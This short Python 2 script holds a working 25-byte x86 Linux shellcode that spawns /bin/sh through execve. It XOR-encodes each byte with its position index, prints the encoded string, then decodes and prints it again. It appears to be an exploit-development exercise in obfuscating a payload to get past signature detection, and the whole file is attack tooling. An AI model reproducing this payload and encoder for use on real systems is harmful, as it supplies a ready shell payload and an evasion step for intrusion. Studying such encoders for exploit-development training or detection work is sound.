shellcode=("\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80")
encoded=''
decoded=''

#ENCODE PART
for value,x in enumerate(bytearray(shellcode)):
	value=hex(value)
	y=hex(x^int(value,16))
	encoded+=str(y)+","
encode_string=encoded[:-1]
print ("ENCODE STRING:")
print encode_string


#DECODE STRING
for value,element in enumerate((encode_string.split(","))):
	value=hex(value)
	decoded+=hex(int(element,16)^int(value,16))+","
print ("DECODE STRING:")
print decoded[:-1]
